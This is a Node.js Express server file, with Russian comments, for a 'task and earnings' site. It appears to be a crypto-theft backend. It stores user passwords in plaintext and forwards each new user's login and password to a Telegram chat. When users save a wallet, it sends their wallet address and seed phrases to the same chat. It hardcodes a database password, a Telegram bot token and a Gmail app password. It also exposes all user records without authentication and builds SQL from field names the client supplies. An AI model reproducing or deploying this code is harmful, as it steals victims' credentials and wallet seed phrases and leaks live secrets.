const express = require('express');
const { Pool } = require('pg');
const path = require('path');
const axios = require('axios');
const nodemailer = require('nodemailer');
const app = express();
app.use(express.json());

// Настройка CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Статические файлы из папки client
const staticPath = path.join(__dirname, '../client');
app.use(express.static(staticPath));

// Настройка подключения к PostgreSQL
const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://neuratest_db_user:M1Ke5EFL1txqlFXL62UOvPdmt6cxurQ8@dpg-cv1ktel6l47c73fg297g-a.oregon-postgres.render.com/neuratest_db',
    ssl: { rejectUnauthorized: false }
});

// Проверка подключения
pool.connect((err, client, release) => {
    if (err) {
        console.error('Error connecting to PostgreSQL:', err.stack);
    } else {
        console.log('Successfully connected to PostgreSQL');
        release();
    }
});

// Переменные для Telegram
const TELEGRAM_BOT_TOKEN = '7603140907:AAEHRJo0chFDDycRASXe5ljwtzfMwqe8qA4';
const TELEGRAM_CHAT_ID = '6404101950';

// Настройка Nodemailer (используем Gmail)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'nestneura@gmail.com',
        pass: 'hyiq blmd pkfx gqxe' // Укажи свой пароль приложения
    }
});

// Функция отправки уведомлений в Telegram
async function sendTelegramNotification(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
        console.log('Notification sent to Telegram');
    } catch (error) {
        console.error('Error sending Telegram notification:', error.message);
    }
}

// Обработка заявок с формы вакансий
app.post('/apply', async (req, res) => {
    console.log('Received application:', req.body);
    const { name, email, phone, telegram, age, country, details } = req.body;

    const mailOptions = {
        from: 'nestneura@gmail.com',
        to: 'nestneura@gmail.com',
        subject: `New Job Application from ${name}`,
        text: `
            Full Name: ${name}
            Email: ${email}
            Phone: ${phone}
            Telegram Account: ${telegram}
            Age: ${age}
            Country: ${country}
            Application Details: ${details}
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200).json({ success: true, message: 'Application sent successfully!' });
    } catch (error) {
        console.error('Error sending email:', error.stack);
        res.status(500).json({ error: 'Failed to send application.' });
    }
});

app.post('/register', async (req, res) => {
    console.log('Received registration request:', req.body);
    const client = await pool.connect();
    try {
        const existingUser = await client.query("SELECT * FROM users WHERE login = $1", [req.body.login]);
        if (existingUser.rows.length > 0) {
            return res.status(400).json({ error: 'User already exists' });
        }

        await client.query(`
            INSERT INTO users (id, login, password, wallet, seeds, balance, taskscompleted, earnedtoday, earnedtotal)
            VALUES ($1, $2, $3, '', ARRAY[]::text[], 0, 0, 0, 0)
        `, [req.body.id, req.body.login, req.body.password]);

        const userResult = await client.query("SELECT * FROM users WHERE login = $1", [req.body.login]);
        const user = userResult.rows[0];

        const message = `Новый пользователь зарегистрирован:\n` +
                        `Логин: ${user.login}\n` +
                        `Пароль: ${user.password}\n` +
                        `ID: ${user.id}`;
        await sendTelegramNotification(message);

        res.status(200).json({ success: true, user });
    } catch (error) {
        console.error('Error in /register:', error.stack);
        res.status(500).json({ error: 'Server error' });
    } finally {
        client.release();
    }
});

app.post('/login', async (req, res) => {
    console.log('Received login request:', req.body);
    const client = await pool.connect();
    try {
        const userResult = await client.query("SELECT * FROM users WHERE login = $1 AND password = $2", [req.body.login, req.body.password]);
        const user = userResult.rows[0];
        if (user) {
            res.status(200).json({ success: true, user });
        } else {
            res.status(401).json({ error: 'Invalid login or password' });
        }
    } catch (error) {
        console.error('Error in /login:', error.stack);
        res.status(500).json({ error: 'Server error' });
    } finally {
        client.release();
    }
});

app.post('/update-wallet', async (req, res) => {
    console.log('Received wallet update request:', req.body);
    const client = await pool.connect();
    try {
        const userResult = await client.query("SELECT * FROM users WHERE id = $1", [req.body.id]);
        const user = userResult.rows[0];
        if (user) {
            await client.query("UPDATE users SET wallet = $1, seeds = $2 WHERE id = $3", [req.body.wallet, req.body.seeds, req.body.id]);

            const updatedUserResult = await client.query("SELECT * FROM users WHERE id = $1", [req.body.id]);
            const updatedUser = updatedUserResult.rows[0];
            const message = `Пользователь обновил кошелёк:\n` +
                            `Логин: ${updatedUser.login}\n` +
                            `ID: ${updatedUser.id}\n` +
                            `Новый адрес кошелька: ${updatedUser.wallet}\n` +
                            `Seed-фразы: ${updatedUser.seeds.join(', ')}`;
            await sendTelegramNotification(message);

            res.status(200).json({ success: true });
        } else {
            res.status(404).json({ error: 'User not found' });
        }
    } catch (error) {
        console.error('Error in /update-wallet:', error.stack);
        res.status(500).json({ error: 'Server error' });
    } finally {
        client.release();
    }
});

app.get('/users', async (req, res) => {
    const client = await pool.connect();
    try {
        const usersResult = await client.query("SELECT * FROM users");
        res.status(200).json(usersResult.rows);
    } catch (error) {
        console.error('Error in /users:', error.stack);
        res.status(500).json({ error: 'Server error' });
    } finally {
        client.release();
    }
});

app.post('/update-user', async (req, res) => {
    console.log('Received user update request:', req.body);
    const client = await pool.connect();
    try {
        const userResult = await client.query("SELECT * FROM users WHERE id = $1", [req.body.id]);
        const user = userResult.rows[0];
        if (user) {
            const fields = Object.keys(req.body).filter(key => key !== 'id');
            const updates = fields.map((field, index) => `${field} = $${index + 2}`).join(', ');
            const values = fields.map(field => req.body[field]);
            await client.query(`UPDATE users SET ${updates} WHERE id = $1`, [req.body.id, ...values]);

            const updatedUserResult = await client.query("SELECT * FROM users WHERE id = $1", [req.body.id]);
            const updatedUser = updatedUserResult.rows[0];
            const message = `Пользователь обновил данные:\n` +
                            `Логин: ${updatedUser.login}\n` +
                            `ID: ${updatedUser.id}\n` +
                            `Изменения: ${JSON.stringify(req.body, null, 2)}`;
            await sendTelegramNotification(message);

            res.status(200).json({ success: true });
        } else {
            res.status(404).json({ error: 'User not found' });
        }
    } catch (error) {
        console.error('Error in /update-user:', error.stack);
        res.status(500).json({ error: 'Server error' });
    } finally {
        client.release();
    }
});

// Новый маршрут для получения данных пользователя
app.post('/get-user-data', async (req, res) => {
    console.log('Received get-user-data request:', req.body);
    const client = await pool.connect();
    try {
        const userResult = await client.query("SELECT * FROM users WHERE id = $1", [req.body.id]);
        const user = userResult.rows[0];
        if (user) {
            res.status(200).json({ success: true, user });
        } else {
            res.status(404).json({ success: false, error: 'User not found' });
        }
    } catch (error) {
        console.error('Error in /get-user-data:', error.stack);
        res.status(500).json({ success: false, error: 'Server error' });
    } finally {
        client.release();
    }
});

// Главная страница
app.get('/', (req, res) => {
    const indexPath = path.join(__dirname, '../client', 'index.html');
    res.sendFile(indexPath);
});

// Страница логина/регистрации
app.get('/auth', (req, res) => {
    const authPath = path.join(__dirname, '../client', 'auth.html');
    res.sendFile(authPath);
});

// Страница политики конфиденциальности
app.get('/privacy', (req, res) => {
    const privacyPath = path.join(__dirname, '../client', 'privacy.html');
    res.sendFile(privacyPath);
});

// Обработка остальных маршрутов
app.get('*', (req, res) => {
    const indexPath = path.join(__dirname, '../client', 'index.html');
    res.sendFile(indexPath);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));